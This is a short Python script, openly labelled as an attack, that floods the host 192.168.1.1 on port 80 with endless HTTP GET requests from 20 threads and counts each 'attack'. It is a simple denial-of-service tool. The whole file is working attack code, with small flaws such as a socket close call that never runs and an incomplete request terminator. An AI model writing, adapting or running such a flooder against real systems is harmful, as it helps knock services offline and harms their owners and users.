#import dependencies
import socket
import threading

#method to facilitate the attack using socket
attack_num = 0
def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('192.168.1.1', 80))
        s. send(b'GET / HTTP/1.1\r\nHost:192.168.1.1\r\n\r')
        resp = s.recv(4096)
        
        global attack_num
        attack_num += 1
        print('Attack_number' , attack_num)
        s.close

#use multithreading to send many requests at once
for i in range(20):
    thread = threading.Thread(target=attack)
    thread.start()
